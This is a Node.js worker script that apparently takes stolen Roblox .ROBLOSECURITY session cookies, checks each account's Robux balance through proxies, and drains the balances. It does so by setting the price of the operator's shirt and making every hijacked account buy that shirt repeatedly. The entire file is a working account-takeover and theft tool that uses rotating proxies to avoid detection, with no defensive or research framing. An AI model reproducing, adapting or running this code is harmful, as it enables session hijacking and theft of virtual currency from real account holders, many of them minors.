const { parentPort, workerData } = require("worker_threads");
const readline = require("readline");
const request = require("request").defaults({ timeout: 10000 });
const chalk = require("chalk");
const cron = require("node-cron");
const rbx = require("./rbx");
const fs = require("fs");
const _ = require("lodash");

let proxies = [];
let cookies = [];
let scanned = [];
let transferAmount = 0;
let transferred = 0;

let shirtPrices = [1, 2, 3, 4, 5000, 1000, 500, 100, 50, 10, 5];

const readProxies = () => {
  const fileExists = fs.existsSync(`./proxies.txt`);
  if (!fileExists) {
    parentPort.postMessage({
      error: true,
      data: `Please put proxies in proxies.txt for the program to work!`,
    });
    return process.exit(1);
  }

  parentPort.postMessage({
    error: false,
    data: `Reading proxies...`,
  });

  const rl = readline.createInterface(fs.createReadStream(`./proxies.txt`));

  rl.on("line", (data) => {
    if (!data) return;

    proxies.push(data);
  });

  rl.on("close", () => {
    if (proxies.length < 1) {
      parentPort.postMessage({
        error: true,
        data: `No proxies available!`,
      });
      return process.exit(1);
    }

    parentPort.postMessage({
      error: false,
      data: `Read ${proxies.length} proxies!`,
    });

    readCookies();
  });
};

const readCookies = () => {
  const fileExists = fs.existsSync(`./cookies/${workerData.filename}`);
  if (!fileExists) {
    parentPort.postMessage({
      error: true,
      data: `${workerData.filename} does not exist!`,
    });
    return process.exit(1);
  }

  parentPort.postMessage({
    error: false,
    data: `Reading cookies from: ${workerData.filename}!`,
  });

  const rl = readline.createInterface(
    fs.createReadStream(`./cookies/${workerData.filename}`)
  );

  rl.on("line", (data) => {
    if (!data) return;

    let cookie = data
      .split(".--")
      .find((c) => c.startsWith("Sharing-this-will"));
    if (cookie) cookies.push(`_|WARNING:-DO-NOT-SHARE-THIS.--${cookie}`);
  });

  rl.on("close", () => {
    if (cookies.length < 1) {
      parentPort.postMessage({
        error: true,
        data: `No cookies in: ${workerData.filename}!`,
      });
      return process.exit(1);
    }

    parentPort.postMessage({
      error: false,
      data: `Read ${cookies.length} cookie(s)! Initializing...`,
    });

    init();
  });
};

const init = () => {
  const start = () => {
    parentPort.postMessage({ error: false, data: `Scanning cookies...` });
    let chunks = _.chunk(cookies, Math.ceil(cookies.length / workerData.tasks));
    let promises = [];

    chunks.forEach((chunk) => {
      let p = new Promise((res, rej) => {
        scanCookies(
          chunk,
          res,
          0,
          proxies[Math.floor(Math.random() * proxies.length)]
        );
      });

      promises.push(p);
    });

    Promise.all(promises).then(() => {
      parentPort.postMessage({
        error: false,
        data: `Cookies scanned successfully! Estimated transfer amount: R$${transferAmount.toLocaleString()}! Initializing transfer...`,
      });

      main(0);
    });
  };

  if (workerData.wait) {
    parentPort.postMessage({
      error: false,
      data: `Wait enabled in config! Pausing until runtime...`,
    });
    //start cron
    let task = cron.schedule(workerData.startTime, () => {
      start();
      task.stop();
    });
  } else {
    start();
  }
};

const scanCookies = (chunk, resolve, position, proxy) => {
  if (!chunk[position]) {
    return resolve();
  }

  request.get(
    "https://api.roblox.com/currency/balance",
    {
      headers: {
        Cookie: `.ROBLOSECURITY=${chunk[position]}`,
      },
      json: true,
    },
    (error, response, body) => {
      if (error) {
        if (workerData.debug)
          console.log(chalk.yellow("Network error! Retrying..."));

        return scanCookies(
          chunk,
          resolve,
          position,
          proxies[Math.floor(Math.random() * proxies.length)]
        );
      }

      if (body.robux !== undefined) {
        if (body.robux >= 5) {
          if (workerData.debug)
            console.log(chalk.green(`Valid cookie! Balance: ${body.robux}`));

          scanned.push({ cookie: chunk[position], robux: body.robux });
          transferAmount += body.robux;
        } else {
          if (workerData.debug)
            console.log(
              chalk.magenta(`Valid cookie with <5R$! Balance: ${body.robux}`)
            );
        }
      } else {
        if (workerData.debug)
          console.log(chalk.red("Cookie invalid or account banned!"));
      }

      scanCookies(chunk, resolve, position + 1, proxy);
    }
  );
};

const main = async (shirtValPos) => {
  if (!shirtPrices[shirtValPos]) {
    return parentPort.postMessage({
      error: false,
      data: `All possible cookies transferred successfully! R$${transferred.toLocaleString()}! Initializing transfer...`,
    });
  }

  let transferableCookies =
    shirtValPos < 4
      ? scanned.filter((c) => c.robux % 5 == shirtPrices[shirtValPos])
      : scanned.filter((c) => c.robux >= shirtPrices[shirtValPos]);
  let shirtPrice =
    shirtValPos < 4 ? 5 + shirtPrices[shirtValPos] : shirtPrices[shirtValPos];

  if (transferableCookies.length > 0) {
    parentPort.postMessage({
      error: false,
      data: `Transferring from ${
        transferableCookies.length
      } cookies @ R$${shirtPrice.toLocaleString()}`,
    });

    //set shirt price
    try {
      await rbx.setShirtPrice(
        workerData.assetId,
        workerData.cookie,
        shirtPrice,
        workerData.proxy
      );
      parentPort.postMessage({
        error: false,
        data: `Shirt price set to ${shirtPrice}!`,
      });
    } catch (error) {
      if (error.rl) {
        parentPort.postMessage({
          error: true,
          data: error.data,
        });
        return setTimeout(() => {
          main(shirtValPos);
        }, 60000);
      }

      if (error.banned) {
        parentPort.postMessage({
          error: true,
          data: error.data,
        });
        return process.exit(1);
      }

      if (error.retry) {
        parentPort.postMessage({
          error: true,
          data: error.data,
        });
        return main(shirtValPos);
      }

      //catch unknown errors
      return parentPort.postMessage({
        error: true,
        data: `UNKNOWN ERROR: ${error.data}`,
      });
    }

    let purchasePromises = [];

    //loop over cookies and purchase
    const purchase = async (purchaseChunk, purchasePosition, res, proxy) => {
      if (!purchaseChunk[purchasePosition]) {
        if (workerData.debug) console.log("Finished! Resolving promise...");
        return res();
      }

      if (workerData.debug) console.log("Attempting transfer...");

      try {
        await rbx.deleteShirt(
          workerData.assetId,
          purchaseChunk[purchasePosition].cookie,
          proxy
        );

        if (workerData.debug)
          console.log(chalk.green("Deleted shirt from inventory!"));

        await rbx.buyShirt(
          workerData.assetId,
          purchaseChunk[purchasePosition].cookie,
          shirtPrice,
          proxy
        );

        if (workerData.debug) console.log(chalk.green("Bought shirt!"));

        transferred += shirtPrice;
      } catch (error) {
        parentPort.postMessage({
          error: true,
          data: error.data,
        });

        if (error.retry)
          return purchase(
            purchaseChunk,
            purchasePosition,
            res,
            proxies[Math.floor(Math.random() * proxies.length)]
          );

        return purchase(purchaseChunk, purchasePosition + 1, res, proxy);
      }

      //if shirtValPos < 4, buy, delete and go to the next phase
      //DO NOT LOOP BUY UNTIL BALANCE IS OUT
      if (shirtValPos < 4) {
        purchase(purchaseChunk, purchasePosition + 1, res, proxy);
      } else {
        purchaseChunk[purchasePosition].robux -= shirtPrice;

        if (purchaseChunk[purchasePosition].robux < shirtPrice) {
          purchase(purchaseChunk, purchasePosition + 1, res, proxy);
        } else {
          purchase(purchaseChunk, purchasePosition, res, proxy);
        }
      }
    };

    let purchaseChunks = _.chunk(
      transferableCookies,
      Math.ceil(transferableCookies.length / 10)
    );

    purchaseChunks.forEach((c) => {
      let p = new Promise((res, rej) => {
        purchase(
          c,
          0,
          res,
          proxies[Math.floor(Math.random() * proxies.length)]
        );
      });

      purchasePromises.push(p);
    });

    Promise.all(purchasePromises).then(() => {
      //logic for completing purchases
      parentPort.postMessage({
        error: false,
        data: `Transferred ${transferred.toLocaleString()} @ ${shirtPrice.toLocaleString()}`,
      });

      main(shirtValPos + 1);
    });
  } else {
    main(shirtValPos + 1);
  }
};

readProxies();
